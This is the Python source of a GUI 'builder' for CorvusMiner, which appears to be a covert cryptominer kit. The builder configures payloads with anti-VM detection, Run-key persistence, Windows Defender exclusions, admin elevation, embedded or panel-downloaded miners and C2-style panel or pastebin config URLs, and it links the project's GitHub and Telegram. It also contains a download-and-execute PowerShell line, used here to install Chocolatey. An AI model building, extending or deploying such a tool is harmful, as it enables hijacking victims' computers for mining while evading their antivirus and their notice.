#!/usr/bin/env python3
"""
CorvusMiner GUI Builder
A visual interface for building CorvusMiner with custom configurations.
Wraps the PowerShell build.ps1 script and provides real-time output monitoring.
"""

import PySimpleGUI as sg
import subprocess
import json
import os
import threading
import sys
from pathlib import Path
from datetime import datetime

# Configuration - Find build.ps1 in the right place
# When running as PyInstaller exe, look in multiple locations
# This handles cases where the exe is extracted to a temp directory

def find_project_root():
    """Find the CorvusMiner project root by searching for the Client folder."""
    # Start from the script's directory
    current = Path(__file__).resolve().parent
    
    # Search up the directory tree for the Client folder
    for _ in range(10):  # Limit search to 10 levels up
        client_path = current / "Client"
        if client_path.exists() and client_path.is_dir():
            return current
        
        # Also check if we're in a dist/build folder (PyInstaller)
        if current.name in ['dist', 'build', 'build_spec']:
            parent = current.parent
            client_path = parent / "Client"
            if client_path.exists():
                return parent
        
        parent = current.parent
        if parent == current:  # Reached root
            break
        current = parent
    
    # Fallback to current working directory
    return Path.cwd()

SCRIPT_DIR = find_project_root()

# Try to find build.ps1 in multiple locations
_possible_paths = [
    SCRIPT_DIR / "Builder" / "build.ps1",  # Builder subdirectory
    SCRIPT_DIR / "build.ps1",  # Same directory as project root
    Path(__file__).parent / "build.ps1",  # Same directory as this script
]

BUILD_SCRIPT = None
for path in _possible_paths:
    if path.exists():
        BUILD_SCRIPT = path
        break

if BUILD_SCRIPT is None:
    BUILD_SCRIPT = SCRIPT_DIR / "Builder" / "build.ps1"  # Fallback, will error later if not found

PROFILES_FILE = SCRIPT_DIR / "Builder" / "build_profiles.json"

# GUI Theme - Professional Dark
sg.theme('DarkGrey1')
sg.set_options(
    font=('Segoe UI', 10),
    margins=(10, 10),
    button_color=('white', '#0066CC'),
    input_text_color='black',
    background_color='#2b2b2b'
)

class BuildProfile:
    """Manages build configuration profiles."""
    
    def __init__(self):
        self.profiles = self.load_profiles()
    
    def load_profiles(self):
        """Load profiles from JSON file."""
        if PROFILES_FILE.exists():
            try:
                with open(PROFILES_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def save_profiles(self):
        """Save profiles to JSON file."""
        with open(PROFILES_FILE, 'w') as f:
            json.dump(self.profiles, f, indent=2)
    
    def save_profile(self, name, config):
        """Save a build configuration as a named profile."""
        self.profiles[name] = config
        self.save_profiles()
    
    def get_profile(self, name):
        """Retrieve a saved profile."""
        return self.profiles.get(name)
    
    def delete_profile(self, name):
        """Delete a profile."""
        if name in self.profiles:
            del self.profiles[name]
            self.save_profiles()
    
    def list_profiles(self):
        """Get list of profile names."""
        return list(self.profiles.keys())


class DependencyChecker:
    """Checks and installs build dependencies."""
    
    def __init__(self, output_callback):
        self.output_callback = output_callback
    
    def check_dependencies(self):
        """Check if all dependencies are installed. Returns (all_ok, report)."""
        report = {
            'chocolatey': False,
            'cmake': False,
            'mingw': False,
        }
        
        # Use PowerShell to check all commands (better PATH resolution)
        ps_command = """
        $results = @{}
        
        # Check Chocolatey
        try {
            $results['chocolatey'] = (Get-Command choco -ErrorAction SilentlyContinue) -ne $null
        } catch {
            $results['chocolatey'] = $false
        }
        
        # Check CMake
        try {
            $results['cmake'] = (Get-Command cmake -ErrorAction SilentlyContinue) -ne $null
        } catch {
            $results['cmake'] = $false
        }
        
        # Check MinGW (g++)
        try {
            $results['mingw'] = (Get-Command g++ -ErrorAction SilentlyContinue) -ne $null
        } catch {
            $results['mingw'] = $false
        }
        
        # Output results as JSON
        $results | ConvertTo-Json
        """
        
        try:
            result = subprocess.run(
                ['powershell', '-NoProfile', '-Command', ps_command],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                import json as json_module
                data = json_module.loads(result.stdout.strip())
                report.update(data)
        except Exception as e:
            # Fallback: try direct command check
            pass
        
        all_ok = all(report.values())
        return all_ok, report
    
    def install_dependencies(self):
        """Run the build script to install missing dependencies."""
        self.output_callback("[*] Installing dependencies...\n")
        
        ps_command = f"""
        $ErrorActionPreference = 'Continue'
        
        # Standard Chocolatey installation path
        $chocoPath = "C:\\ProgramData\\chocolatey\\bin\\choco.exe"
        
        # Check if Chocolatey is installed by checking file existence (not PATH)
        if (-not (Test-Path $chocoPath)) {{
            Write-Host '[*] Installing Chocolatey...' -ForegroundColor Cyan
            Set-ExecutionPolicy Bypass -Scope Process -Force
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
            iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
            Write-Host '[+] Chocolatey installed' -ForegroundColor Green
        }} else {{
            Write-Host '[+] Chocolatey already installed' -ForegroundColor Green
        }}
        
        # Verify choco exists before trying to use it
        if (Test-Path $chocoPath) {{
            # CMake
            Write-Host '[*] Ensuring CMake...' -ForegroundColor Cyan
            $output = & "$chocoPath" install cmake -y -q 2>&1
            if ($LASTEXITCODE -eq 0) {{
                Write-Host '[+] CMake installed successfully' -ForegroundColor Green
            }} else {{
                Write-Host "[!] ERROR: CMake installation failed (exit code: $LASTEXITCODE)" -ForegroundColor Red
                Write-Host $output -ForegroundColor Yellow
            }}
            
            # MinGW
            Write-Host '[*] Ensuring MinGW...' -ForegroundColor Cyan
            $output = & "$chocoPath" install mingw -y -q 2>&1
            if ($LASTEXITCODE -eq 0) {{
                Write-Host '[+] MinGW installed successfully' -ForegroundColor Green
            }} else {{
                Write-Host "[!] ERROR: MinGW installation failed (exit code: $LASTEXITCODE)" -ForegroundColor Red
                Write-Host $output -ForegroundColor Yellow
            }}
        }} else {{
            Write-Host '[!] ERROR: Chocolatey not found at $chocoPath' -ForegroundColor Red
            Write-Host '[!] Please check your Chocolatey installation.' -ForegroundColor Red
        }}
        Write-Host '[*] Dependencies installed. Please restart the GUI.' -ForegroundColor Yellow
        Write-Host ''
        Read-Host 'Press Enter to close this window'
        """
        
        try:
            import tempfile
            
            # Write script to temp file to avoid escaping issues
            with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as f:
                f.write(ps_command)
                temp_script = f.name
            
            try:
                # Request admin elevation to run the dependency installation script
                # Use -NoExit to keep the window open so user can see any errors
                elevated_command = f"Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile', '-NoExit', '-ExecutionPolicy', 'Bypass', '-File', '{temp_script}') -Wait"
                
                process = subprocess.Popen(
                    ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', elevated_command],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1
                )
                
                for line in process.stdout:
                    self.output_callback(line)
                
                process.wait()
                return process.returncode == 0
            finally:
                # Clean up temp script
                if os.path.exists(temp_script):
                    try:
                        os.remove(temp_script)
                    except:
                        pass
        except Exception as e:
            self.output_callback(f"[ERROR] {str(e)}\n")
            return False


class BuildRunner:
    """Executes the PowerShell build script."""
    
    def __init__(self, output_callback):
        self.output_callback = output_callback
        self.process = None
    
    def run_build(self, config):
        """Run the build with the given configuration."""
        if not BUILD_SCRIPT.exists():
            self.output_callback(f"ERROR: Build script not found at {BUILD_SCRIPT}\n")
            return False
        
        self.output_callback(f"[{datetime.now().strftime('%H:%M:%S')}] Starting build...\n")
        self.output_callback(f"Configuration: {json.dumps(config, indent=2)}\n\n")
        
        # Build PowerShell command with script parameters
        ps_params = [
            f"-panel_url '{config.get('panel_url', '')}'",
            f"-config_url '{config.get('config_url', '')}'",
            f"-antivm ${str(config.get('antivm', False)).lower()}",
            f"-persistence ${str(config.get('persistence', False)).lower()}",
            f"-debug_console ${str(config.get('debug_console', False)).lower()}",
            f"-admin_manifest ${str(config.get('admin_manifest', False)).lower()}",
            f"-defender_exclusion ${str(config.get('defender_exclusion', False)).lower()}",
            f"-cpu_miner ${str(config.get('cpu_miner', True)).lower()}",
            f"-gpu_miner ${str(config.get('gpu_miner', False)).lower()}",
            f"-remote_miners ${str(config.get('remote_miners', False)).lower()}",
        ]
        
        cmd = [
            "powershell",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-Command",
            f"& '{BUILD_SCRIPT}' {' '.join(ps_params)}"
        ]
        
        try:
            # Set working directory to script directory to ensure relative paths work correctly
            work_dir = str(SCRIPT_DIR) if SCRIPT_DIR.exists() else None
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1,
                cwd=work_dir
            )
            
            # Read output line by line
            for line in self.process.stdout:
                self.output_callback(line)
            
            self.process.wait()
            return self.process.returncode == 0
        
        except Exception as e:
            self.output_callback(f"ERROR: {str(e)}\n")
            return False


def create_window(profiles):
    """Create the main GUI window."""
    
    # Left column with all settings
    left_column = [
        # Title and status
        [sg.Text("CorvusMiner Builder", font=('Segoe UI', 20, 'bold'), text_color='#0066CC')],
        [sg.Text("Professional Build Configuration", font=('Segoe UI', 11, 'italic'), text_color='#888888')],
        [sg.Text('_' * 65, text_color='#444444')],
        
        # Profile Management
        [
            sg.Frame('Build Profile', [
                [
                    sg.Combo(
                        values=profiles.list_profiles(),
                        key='-PROFILE_SELECTOR-',
                        size=(25, 1),
                        readonly=True,
                        background_color='#3c3c3c',
                        text_color='white'
                    ),
                    sg.Button("Load", key='-LOAD_PROFILE-', size=(8, 1)),
                    sg.Button("Save As", key='-SAVE_PROFILE-', size=(8, 1)),
                    sg.Button("Delete", key='-DELETE_PROFILE-', size=(8, 1)),
                ]
            ], background_color='#2b2b2b', title_color='#0066CC', relief=sg.RELIEF_SUNKEN)
        ],
        
        # Build Configuration
        [
            sg.Frame('Connection Settings', [
                [sg.Text("⚠ WARNING: Use EITHER Panel URL OR Config GET URL, not both!", 
                         font=('Segoe UI', 9, 'bold'), text_color='#FF6600', background_color='#2b2b2b')],
                [sg.Text("You can specify multiple URLs separated by commas (,) for fallback support", 
                         font=('Segoe UI', 9, 'italic'), text_color='#888888', background_color='#2b2b2b')],
                [sg.Text("")],
                [sg.Text("Panel URL:", size=(18, 1), font=('Segoe UI', 10, 'bold')), 
                 sg.InputText(key='-PANEL_URL-', size=(38, 1), background_color='#3c3c3c', text_color='black', selected_background_color='#FFD700', selected_text_color='black')],
                [sg.Text("Example: https://your-panel.com/api/miners/submit,https://backup-panel.com/api/miners/submit", font=('Segoe UI', 8, 'italic'), text_color='#888888', size=(60, 1))],
                [sg.Text("Leave blank if using Config GET URL instead", font=('Segoe UI', 8, 'italic'), text_color='#888888', size=(60, 1))],
                [sg.Text("")],
                [sg.Text("Config GET URL:", size=(18, 1), font=('Segoe UI', 10, 'bold')),
                 sg.InputText(key='-CONFIG_URL-', size=(38, 1), background_color='#3c3c3c', text_color='black', selected_background_color='#FFD700', selected_text_color='black')],
                [sg.Text("Example: https://pastebin.com/raw/YOUR_ID,https://example.com/backup/config.json", font=('Segoe UI', 8, 'italic'), text_color='#888888', size=(60, 1))],
                [sg.Text("Leave blank if using Panel URL instead", font=('Segoe UI', 8, 'italic'), text_color='#888888', size=(60, 1))],
            ], background_color='#2b2b2b', title_color='#0066CC', relief=sg.RELIEF_SUNKEN),
        ],
        
        # Feature Toggles
        [
            sg.Frame('Core Features', [
                [
                    sg.Checkbox("Anti-VM Detection", key='-ANTIVM-', default=False, background_color='#2b2b2b', text_color='white'),
                    sg.Checkbox("Persistence (Run Key)", key='-PERSISTENCE-', default=False, background_color='#2b2b2b', text_color='white'),
                ],
                [
                    sg.Checkbox("Debug Console", key='-DEBUG_CONSOLE-', default=False, background_color='#2b2b2b', text_color='white'),
                    sg.Checkbox("Admin Manifest", key='-ADMIN_MANIFEST-', default=False, background_color='#2b2b2b', text_color='white'),
                ],
                [
                    sg.Checkbox("Defender Exclusion", key='-DEFENDER_EXCLUSION-', default=False, background_color='#2b2b2b', text_color='white'),
                ],
            ], background_color='#2b2b2b', title_color='#0066CC', relief=sg.RELIEF_SUNKEN),
        ],
        
        # Miner Options
        [
            sg.Frame('Miner Configuration', [
                [
                    sg.Checkbox("Embed CPU Miner", key='-CPU_MINER-', default=True, background_color='#2b2b2b', text_color='white', disabled=False),
                    sg.Checkbox("Embed GPU Miner", key='-GPU_MINER-', default=False, background_color='#2b2b2b', text_color='white', disabled=False),
                ],
                [
                    sg.Checkbox("Remote Miners (download from panel)", key='-REMOTE_MINERS-', default=False, background_color='#2b2b2b', text_color='white', disabled=False),
                ],
                [sg.Text("ℹ Panel mode disables embedded miners (all download from panel)", 
                         font=('Segoe UI', 9, 'italic'), text_color='#888888', key='-MINER_INFO-')],
            ], background_color='#2b2b2b', title_color='#0066CC', relief=sg.RELIEF_SUNKEN),
        ],
        
        # BUILD BUTTON
        [sg.Text('_' * 65, text_color='#444444')],
        [sg.Button("BUILD NOW", key='-BUILD-', size=(20, 1), button_color=('white', '#00AA00'), font=('Segoe UI', 12, 'bold')), sg.Button("Clear Output", key='-CLEAR-', size=(15, 1)), sg.Button("Open Build Folder", key='-OPEN_FOLDER-', size=(18, 1)), sg.Button("Info", key='-INFO-', size=(10, 1))],
        [sg.Text('_' * 65, text_color='#444444')],
        
        # Status
        [
            sg.Stretch(),
            sg.Text("Status: ", font=('Segoe UI', 10, 'bold'), text_color='black'),
            sg.Text("Ready", key='-STATUS-', text_color='black', font=('Segoe UI', 10, 'bold')),
        ]
    ]
    
    # Right column with Build Output
    right_column = [
        [sg.Text('Build Output', font=('Segoe UI', 11, 'bold'), text_color='#0066CC')],
        [sg.Multiline(
            size=(60, 50),
            key='-OUTPUT-',
            disabled=True,
            autoscroll=True,
            background_color='#1a1a1a',
            text_color='black',
            font=('Consolas', 9)
        )],
    ]
    
    layout = [
        [
            sg.Column(left_column, background_color='#2b2b2b'),
            sg.Column(right_column, background_color='#2b2b2b')
        ]
    ]
    
    return sg.Window(
        "CorvusMiner Builder",
        layout,
        size=(1600, 900),
        finalize=True,
        background_color='#2b2b2b'
    )


def get_config_from_window(values):
    """Extract configuration from window values."""
    return {
        'panel_url': values['-PANEL_URL-'],
        'config_url': values['-CONFIG_URL-'],
        'antivm': values['-ANTIVM-'],
        'persistence': values['-PERSISTENCE-'],
        'debug_console': values['-DEBUG_CONSOLE-'],
        'admin_manifest': values['-ADMIN_MANIFEST-'],
        'defender_exclusion': values['-DEFENDER_EXCLUSION-'],
        'cpu_miner': values['-CPU_MINER-'],
        'gpu_miner': values['-GPU_MINER-'],
        'remote_miners': values['-REMOTE_MINERS-'],
    }


def set_config_in_window(window, config):
    """Load configuration values into window."""
    window['-PANEL_URL-'].update(config.get('panel_url', ''))
    window['-CONFIG_URL-'].update(config.get('config_url', ''))
    window['-ANTIVM-'].update(config.get('antivm', False))
    window['-PERSISTENCE-'].update(config.get('persistence', False))
    window['-DEBUG_CONSOLE-'].update(config.get('debug_console', False))
    window['-ADMIN_MANIFEST-'].update(config.get('admin_manifest', False))
    window['-DEFENDER_EXCLUSION-'].update(config.get('defender_exclusion', False))
    window['-CPU_MINER-'].update(config.get('cpu_miner', True))
    window['-GPU_MINER-'].update(config.get('gpu_miner', False))
    window['-REMOTE_MINERS-'].update(config.get('remote_miners', False))


def dark_popup_get_text(prompt, title="Input"):
    """Dark-themed input dialog with proper text colors."""
    layout = [
        [sg.Text(prompt, font=('Segoe UI', 10), text_color='black')],
        [sg.InputText(key='-INPUT-', size=(40, 1), background_color='#3c3c3c', text_color='black', font=('Segoe UI', 10), selected_background_color='#FFD700', selected_text_color='black')],
        [sg.Button('OK', size=(8, 1)), sg.Button('Cancel', size=(8, 1))]
    ]
    
    window = sg.Window(title, layout, background_color='#2b2b2b', finalize=True, modal=True)
    window['-INPUT-'].set_focus()
    
    result = None
    while True:
        event, values = window.read()
        if event == sg.WINDOW_CLOSED or event == 'Cancel':
            break
        elif event == 'OK':
            result = values['-INPUT-']
            break
    
    window.close()
    return result


def show_info_window():
    """Display info window with GitHub and Telegram links."""
    github_url = "https://github.com/laprosa/corvusminer"
    telegram_url = "https://t.me/corvusminer"
    
    layout = [
        [sg.Text("CorvusMiner Links", font=('Segoe UI', 14, 'bold'), text_color='#0066CC')],
        [sg.Text("")],
        [sg.Text("GitHub Repository:", font=('Segoe UI', 10, 'bold'), text_color='black')],
        [sg.InputText(
            default_text=github_url,
            size=(50, 1),
            key='-GITHUB-',
            background_color='#3c3c3c',
            text_color='black',
            readonly=True,
            font=('Consolas', 9),
            selected_background_color='#FFD700',
            selected_text_color='black'
        )],
        [sg.Button("Copy GitHub URL", key='-COPY_GITHUB-', size=(20, 1))],
        [sg.Text("")],
        [sg.Text("Telegram Channel:", font=('Segoe UI', 10, 'bold'), text_color='black')],
        [sg.InputText(
            default_text=telegram_url,
            size=(50, 1),
            key='-TELEGRAM-',
            background_color='#3c3c3c',
            text_color='black',
            readonly=True,
            font=('Consolas', 9),
            selected_background_color='#FFD700',
            selected_text_color='black'
        )],
        [sg.Button("Copy Telegram URL", key='-COPY_TELEGRAM-', size=(20, 1))],
        [sg.Text("")],
        [sg.Button("Close", size=(10, 1))]
    ]
    
    window = sg.Window("CorvusMiner Info", layout, background_color='#2b2b2b', finalize=True, modal=True)
    
    while True:
        event, values = window.read()
        
        if event == sg.WINDOW_CLOSED or event == 'Close':
            break
        elif event == '-COPY_GITHUB-':
            try:
                import pyperclip
                pyperclip.copy(github_url)
                sg.popup_quick_message("GitHub URL copied to clipboard!", background_color='#2b2b2b', text_color='white', font=('Segoe UI', 10))
            except ImportError:
                # Fallback: use tkinter's clipboard if pyperclip not available
                import tkinter as tk
                root = tk.Tk()
                root.withdraw()
                root.clipboard_clear()
                root.clipboard_append(github_url)
                root.update()
                root.destroy()
                sg.popup_quick_message("GitHub URL copied to clipboard!", background_color='#2b2b2b', text_color='white', font=('Segoe UI', 10))
        elif event == '-COPY_TELEGRAM-':
            try:
                import pyperclip
                pyperclip.copy(telegram_url)
                sg.popup_quick_message("Telegram URL copied to clipboard!", background_color='#2b2b2b', text_color='white', font=('Segoe UI', 10))
            except ImportError:
                # Fallback: use tkinter's clipboard if pyperclip not available
                import tkinter as tk
                root = tk.Tk()
                root.withdraw()
                root.clipboard_clear()
                root.clipboard_append(telegram_url)
                root.update()
                root.destroy()
                sg.popup_quick_message("Telegram URL copied to clipboard!", background_color='#2b2b2b', text_color='white', font=('Segoe UI', 10))
    
    window.close()


def update_miner_options(panel_url, config_url, window=None):
    """Update miner checkbox states based on URL configuration."""
    if not window:
        return
    
    # Strip whitespace and check if URLs are actually provided
    panel_url = panel_url.strip() if panel_url else ""
    config_url = config_url.strip() if config_url else ""
    
    is_panel_mode = bool(panel_url) and not bool(config_url)  # Panel POST method
    is_get_mode = bool(config_url)  # Direct GET method
    
    # In panel mode: disable embedded miners (they'll be remote loaded)
    window['-CPU_MINER-'].update(disabled=is_panel_mode)
    window['-GPU_MINER-'].update(disabled=is_panel_mode)
    window['-REMOTE_MINERS-'].update(disabled=is_get_mode)
    
    # Update miner info text
    if is_panel_mode:
        window['-MINER_INFO-'].update("ℹ Panel mode: All miners will be downloaded from panel (embedded miners are disabled in this mode)")
    elif is_get_mode:
        window['-MINER_INFO-'].update("ℹ GET mode: Use embedded miners only (remote miners option is not available with direct GET URLs)")
    else:
        window['-MINER_INFO-'].update("ℹ Choose either Panel URL or Config GET URL above, then select miners")


def main():
    """Main application loop."""
    profiles = BuildProfile()
    
    # Check dependencies
    output_queue = []
    def append_output(text):
        output_queue.append(text)
    
    checker = DependencyChecker(append_output)
    all_ok, report = checker.check_dependencies()
    
    if not all_ok:
        # Show dependency status dialog
        status_text = "Build Requirements Status:\n\n"
        status_text += f"✓ Chocolatey: {'READY' if report['chocolatey'] else 'MISSING'}\n"
        status_text += f"✓ CMake: {'READY' if report['cmake'] else 'MISSING'}\n"
        status_text += f"✓ MinGW-w64: {'READY' if report['mingw'] else 'MISSING'}\n\n"
        
        if not all_ok:
            status_text += "Missing dependencies detected!\n\n"
            status_text += "Would you like to install them now?\n"
            status_text += "(This requires Administrator privileges)"
            
            result = sg.popup_yes_no(
                status_text,
                title="Missing Build Requirements",
                background_color='#2b2b2b',
                button_color=('white', '#0066CC')
            )
            
            if result == "Yes":
                # Create a small window to show installation progress
                progress_layout = [
                    [sg.Text("Installing dependencies...", font=('Segoe UI', 11, 'bold'), text_color='#0066CC')],
                    [sg.Multiline(
                        size=(80, 20),
                        key='-PROGRESS-',
                        disabled=True,
                        autoscroll=True,
                        background_color='#1a1a1a',
                        text_color='black',
                        font=('Consolas', 9)
                    )],
                    [sg.Button("Close", key='-CLOSE-')]
                ]
                
                progress_window = sg.Window(
                    "Installing Dependencies",
                    progress_layout,
                    size=(700, 500),
                    finalize=True,
                    background_color='#2b2b2b'
                )
                
                # Run installation in thread
                def install_thread():
                    output_queue.clear()
                    success = checker.install_dependencies()
                    append_output("\n" + ("="*80) + "\n")
                    if success:
                        append_output("[SUCCESS] Dependencies installed!\n")
                        append_output("Please close this window and restart the GUI.\n")
                    else:
                        append_output("[INFO] Installation completed (check output above)\n")
                
                thread = threading.Thread(target=install_thread, daemon=True)
                thread.start()
                
                # Event loop for progress window
                while True:
                    event, values = progress_window.read(timeout=100)
                    
                    if output_queue:
                        current = progress_window['-PROGRESS-'].get()
                        progress_window['-PROGRESS-'].update(current + ''.join(output_queue))
                        output_queue.clear()
                    
                    if event == sg.WINDOW_CLOSED or event == '-CLOSE-':
                        progress_window.close()
                        break
                
                # Ask if user wants to continue
                sg.popup_ok(
                    "Dependencies installation complete.\n\nPlease restart the GUI for changes to take effect.",
                    title="Installation Complete",
                    background_color='#2b2b2b'
                )
                return
            else:
                sg.popup_error(
                    "Build requirements are missing.\n\n"
                    "Please install:\n"
                    "• Chocolatey (package manager)\n"
                    "• CMake 3.10+\n"
                    "• MinGW-w64 (GCC compiler)\n\n"
                    "You can install them manually from:\n"
                    "• Chocolatey: https://chocolatey.org/install\n"
                    "• Then: choco install cmake mingw-w64",
                    background_color='#2b2b2b'
                )
                return
    
    window = create_window(profiles)
    
    def flush_output():
        """Flush queued output to window."""
        if output_queue:
            current = window['-OUTPUT-'].get()
            window['-OUTPUT-'].update(current + ''.join(output_queue))
            output_queue.clear()
    
    runner = BuildRunner(append_output)
    
    # Track previous URL values for change detection
    prev_panel_url = ""
    prev_config_url = ""
    
    while True:
        event, values = window.read(timeout=100)
        
        # Handle window close - values is None when window is closed
        if event == sg.WINDOW_CLOSED:
            break
        
        # Only process if we have valid values
        if values is None:
            continue
        
        flush_output()
        
        # Monitor URL changes to update miner options (check if URLs changed)
        current_panel_url = values['-PANEL_URL-']
        current_config_url = values['-CONFIG_URL-']
        
        if current_panel_url != prev_panel_url or current_config_url != prev_config_url:
            update_miner_options(current_panel_url, current_config_url, window)
            prev_panel_url = current_panel_url
            prev_config_url = current_config_url
        
        if event == '-LOAD_PROFILE-':
            profile_name = values['-PROFILE_SELECTOR-']
            if profile_name:
                config = profiles.get_profile(profile_name)
                if config:
                    set_config_in_window(window, config)
                    window['-OUTPUT-'].update(f"[{datetime.now().strftime('%H:%M:%S')}] Loaded profile: {profile_name}\n")
        
        elif event == '-SAVE_PROFILE-':
            config = get_config_from_window(values)
            profile_name = dark_popup_get_text("Enter profile name:", title="Save Profile")
            if profile_name:
                profiles.save_profile(profile_name, config)
                window['-PROFILE_SELECTOR-'].update(values=profiles.list_profiles())
                window['-OUTPUT-'].update(f"[{datetime.now().strftime('%H:%M:%S')}] Saved profile: {profile_name}\n", append=True)
        
        elif event == '-DELETE_PROFILE-':
            profile_name = values['-PROFILE_SELECTOR-']
            if profile_name:
                if sg.popup_yes_no(f"Delete profile '{profile_name}'?", title="Confirm Delete", background_color='#2b2b2b') == "Yes":
                    profiles.delete_profile(profile_name)
                    window['-PROFILE_SELECTOR-'].update(values=profiles.list_profiles(), value='')
                    window['-OUTPUT-'].update(f"[{datetime.now().strftime('%H:%M:%S')}] Deleted profile: {profile_name}\n", append=True)
        
        elif event == '-CLEAR-':
            window['-OUTPUT-'].update('')
        
        elif event == '-OPEN_FOLDER-':
            # Open the build output folder
            build_folder = SCRIPT_DIR / "Client" / "build"
            
            try:
                if build_folder.exists():
                    os.startfile(str(build_folder))
                else:
                    sg.popup_error(f"Build folder not found at:\n{build_folder}\n\nBuild the project first.", background_color='#2b2b2b')
            except Exception as e:
                sg.popup_error(f"Could not open folder: {str(e)}", background_color='#2b2b2b')
        
        elif event == '-INFO-':
            show_info_window()
        
        elif event == '-BUILD-':
            # Validate inputs
            panel_url = values['-PANEL_URL-'].strip()
            config_url = values['-CONFIG_URL-'].strip()
            
            if not panel_url and not config_url:
                sg.popup_error("Please enter either Panel URL or Config GET URL", background_color='#2b2b2b')
                continue
            
            config = get_config_from_window(values)
            window['-BUILD-'].update(disabled=True)
            window['-STATUS-'].update("Building...", text_color='#FFFF00')
            
            # Run build in a thread to keep UI responsive
            def run_build_thread():
                success = runner.run_build(config)
                if success:
                    append_output(f"\n[{datetime.now().strftime('%H:%M:%S')}] Build completed successfully!\n")
                    window['-STATUS-'].update("Build successful", text_color='black')
                else:
                    append_output(f"\n[{datetime.now().strftime('%H:%M:%S')}] Build failed!\n")
                    window['-STATUS-'].update("Build failed", text_color='#FF0000')
                window['-BUILD-'].update(disabled=False)
            
            thread = threading.Thread(target=run_build_thread, daemon=True)
            thread.start()
    
    window.close()


if __name__ == '__main__':
    main()
